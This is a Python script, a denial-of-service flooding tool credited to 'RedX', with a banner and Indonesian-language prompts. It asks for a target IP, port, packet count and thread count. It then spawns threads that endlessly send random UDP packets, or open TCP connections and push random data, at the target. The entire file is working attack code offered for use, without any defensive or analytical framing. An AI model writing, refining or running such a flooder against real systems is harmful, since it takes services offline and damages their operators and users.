#!/usr/bin/env python3
#Ddos by RedX
import random
import socket
import threading
import os

os.system("clear")
print("\033[93m")
print('''\033[94m  Tools By RedX
██████╗░███████╗██████ ╗██╗░░██╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
██████╔╝█████╗░░██║░░██║░╚███╔╝
██╔══██╗██╔══╝░░██║░░██║░██╔██╗
██║░░██║███████╗██████╔╝██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝

------------------------------------------------------------
      >Jangan Abuse Ya Maniez<         
          >Tools By RedX<              
-----------------------------------------------------------
''')
ip = str(input("DdosAttackByRedX | ip:"))
port = int(input("DdosAttackByRedX | port:"))
choice = str(input("DdosAttackByRedX | Serang Ga Ni?(y/n):"))
times = int(input("DdosAttackByRedX | Packets:"))
threads = int(input("DdosAttackByRedX | Threads:"))
def run():
        data = random._urandom(1024)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print("\033[92m [*] RedX Menyenggol ")
                except:
                        print("\033[94m [!] RedX IS HERE DUDE! ")
def run2():
        data = random._urandom(860)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                             s.send(data)
                        print("\033[92m[*] RedX Menyenggol")
                except:
                        s.close()
                        print("\033[93m[*] RedX In Here Dude")
for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
        else:
                 th = threading.Thread(target = run2)
                 th.start()
